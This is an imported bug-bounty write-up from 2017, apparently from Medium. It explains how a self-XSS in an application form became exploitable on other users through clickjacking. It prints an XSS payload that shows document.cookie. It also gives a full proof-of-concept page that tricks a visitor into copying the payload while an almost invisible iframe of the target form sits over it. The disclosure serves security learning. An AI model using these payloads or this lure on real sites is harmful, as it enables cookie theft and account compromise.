---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-07-20_self-xss-to-good-xss-clickjacking.md
original_filename: 2017-07-20_self-xss-to-good-xss-clickjacking.md
title: Self XSS to Good XSS Clickjacking
category: documents
detected_topics:
- xss
- command-injection
- clickjacking
tags:
- imported
- documents
- xss
- command-injection
- clickjacking
language: en
raw_sha256: 1c9702551cf459ef91a809bd1ded5546ac6583a891d95c5126cb1d3c564c0565
text_sha256: 589dd4b094fe2fa589c57ea753e5774e9e07721219a83938840aac17a2e27d99
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Self XSS to Good XSS Clickjacking

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-07-20_self-xss-to-good-xss-clickjacking.md
- Source Type: markdown
- Detected Topics: xss, command-injection, clickjacking
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `1c9702551cf459ef91a809bd1ded5546ac6583a891d95c5126cb1d3c564c0565`
- Text SHA256: `589dd4b094fe2fa589c57ea753e5774e9e07721219a83938840aac17a2e27d99`


## Content

---
title: "Self XSS to Good XSS Clickjacking"
url: "https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e"
authors: ["Arbaz Hussain (@ArbazKiraak)"]
bugs: ["XSS", "Clickjacking"]
bounty: "300"
publication_date: "2017-07-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6147
scraped_via: "browseros"
---

# Self XSS to Good XSS Clickjacking

Self XSS to Good XSS Clickjacking
Arbaz Hussain
Follow
2 min read
·
Jul 20, 2017

198

3

Severity : High

Complexity: Easy

Weakness: Cross Site Scripting

While Testing one of the Private on HackerOne , I Land up on the following page.

https://sub.site.com/application/request/form

Page contain’s Form To submit the detail’s of their application .

‘>“/><svg/onload=prompt(document.cookie)>

Get Arbaz Hussain’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

As soon as i started entering Payload in this Field , Pop up Appear’s .

Self-XSS

Since Form is Vulnerable to Self XSS ,But Plus Point was There was No X-Frame-Header or Click-jacking Protection . Which Make’s the Attack Easier And Converted it to Well Working XSS on Other User’s .

Simple Demo POC:

<html>
<head><title>Poc</title></head>
<body>
<h1>Welcome to Click Games</h1>
Message :<input id="copy-text" type="text" value='"/><svg/onload=prompt(document.domain)>"'>
<br><br><br>
<script>
document.getElementById("copy-text").onclick = function(){
this.select();
document.execCommand('copy');
alert("You'r Game Begins!")
}
</script>
<style>
iframe {
width: 600px;
height: 450px;
position: absolute;
top: 0; right: 10;
filter: alpha(opacity=50);
opacity: 0.1;
}
</style>
<iframe src="https://sub.site.com/application/request/form"></iframe>
</body>
</html>
Press enter or click to view image in full size
